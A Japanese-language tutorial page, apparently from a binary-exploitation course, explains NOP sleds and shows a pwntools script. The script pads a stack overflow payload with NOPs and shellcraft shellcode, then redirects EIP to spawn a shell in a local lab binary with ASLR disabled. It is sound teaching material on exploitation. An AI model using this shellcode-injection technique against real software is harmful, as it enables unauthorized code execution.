---
description: より確実なシェルコードエクスプロイト
---

# NOPs

NOP(no operation)命令は、その名のとおり _何もしません_。そのため、次の命令を実行するだけの NOP は、シェルコードを使うエクスプロイトでとても役に立ちます。エクスプロイトの左側を NOP で埋め、EIP をその真ん中あたりに向ければ、実際のシェルコードに到達するまで何もしない命令を実行し続けます。こうすると、数バイト前後にずれても、実行される NOP 命令の数が変わるだけで、最終的にシェルコードが実行される結果は同じなので、誤差の許容範囲が広がります。この NOP による埋め込みは、EIP が NOP の上を滑り降りていくように見えることから、NOP スライド(NOP slide)または NOP sled と呼ばれます。

Intel x86 アセンブリでは、NOP 命令は `\x90` です。

{% hint style="info" %}
NOP 命令はもともと `XCHG EAX, EAX` を指しており、これは事実上何もしません。詳しくは[この StackOverflow の質問](https://stackoverflow.com/questions/25008772/whats-the-difference-between-the-x86-nop-and-fnop-instructions/25053039)を参照してください。
{% endhint %}

### Updating our Shellcode Exploit

エクスプロイトに少し手を加えて、次の2つを行います。

* 左側に大量の NOP を追加する
* リターンポインタを、バッファの先頭ではなく NOP の真ん中を指すように調整する

{% hint style="warning" %}
ASLR が引き続き無効になっていることを確認してください。もう一度無効にする必要があった場合は、バッファの位置が変わっている可能性があるため、以前のエクスプロイトを調整し直す必要があるかもしれません。
{% endhint %}

```python
from pwn import *

context.binary = ELF('./vuln')

p = process()

payload = b'\x90' * 240                 # NOP
payload += asm(shellcraft.sh())         # シェルコード
payload = payload.ljust(312, b'A')      # パディング
payload += p32(0xffffcfb4 + 120)        # バッファのアドレス + NOP の長さの半分

log.info(p.clean())

p.sendline(payload)

p.interactive()
```

{% hint style="warning" %}
NOP を使ったシェルコードが確実とは限らない点には触れておくべきでしょう。NOP で埋めたら予期しないエラーが出て、以前はシェルコードが動いていたのであれば、nopsled が短くなるよう試してみてください。スタック上のほかのものを壊している可能性があります。
{% endhint %}

NOP が `\x90` になるのは特定のアーキテクチャだけです。ほかのアーキテクチャが必要な場合は pwntools を使えます。

```python
nop = asm(shellcraft.nop())
```
